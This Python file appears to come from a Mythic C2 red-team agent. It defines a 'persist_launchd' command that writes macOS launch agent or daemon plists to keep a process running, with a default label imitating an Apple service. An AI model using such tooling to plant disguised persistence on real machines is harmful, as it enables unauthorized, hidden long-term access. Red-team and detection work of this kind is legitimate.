from mythic_payloadtype_container.MythicCommandBase import *
import json

class PersistLaunchdArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="args",
                type=ParameterType.Array,
                description="List of arguments to execute in the ProgramArguments section of the PLIST",
            ),
            CommandParameter(
                name="KeepAlive",
                type=ParameterType.Boolean,
                default_value=True,
                description="When this value is set to true, Launchd will restart the daemon if it dies",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False
                    )
                ]
            ),
            CommandParameter(
                name="RunAtLoad",
                type=ParameterType.Boolean,
                default_value=False,
                description="When this value is set to true, Launchd will immediately start the daemon/agent once it has been registered",
                parameter_group_info=[
                    ParameterGroupInfo(
                        required=False
                    )
                ]
            ),
            CommandParameter(
                name="Label",
                type=ParameterType.String,
                default_value="com.apple.mdmupdateagent",
                description="The label for launch persistence",
            ),
            CommandParameter(
                name="LaunchPath",
                type=ParameterType.String,
                description="Path to save the new plist"
            ),
            CommandParameter(
                name="LocalAgent",
                type=ParameterType.Boolean,
                default_value=True,
                description="Should be a local user launch agent"
            ),
        ]

    async def parse_arguments(self):
        if len(self.command_line) > 0:
            if self.command_line[0] == "{":
                self.load_args_from_json_string(self.command_line)
            else:
                raise ValueError("Missing JSON arguments")

        else:
            raise ValueError("Missing arguments")

    async def parse_dictionary(self, dictionary):
        self.load_args_from_dictionary(dictionary)


class PersistLaunchdCommand(CommandBase):
    cmd = "persist_launchd"
    needs_admin = False
    help_cmd = "persist_launchd"
    description = "Create a launch agent or daemon plist file and save it to ~/Library/LaunchAgents or /Library/LaunchDaemons"
    version = 1
    author = "@xorrior"
    attackmapping = ["T1543.001", "T1543.004"]
    argument_class = PersistLaunchdArguments
    attributes = CommandAttributes(
        supported_os=[SupportedOS.MacOS]
    )

    async def create_tasking(self, task: MythicTask) -> MythicTask:
        return task

    async def process_response(self, response: AgentResponse):
        pass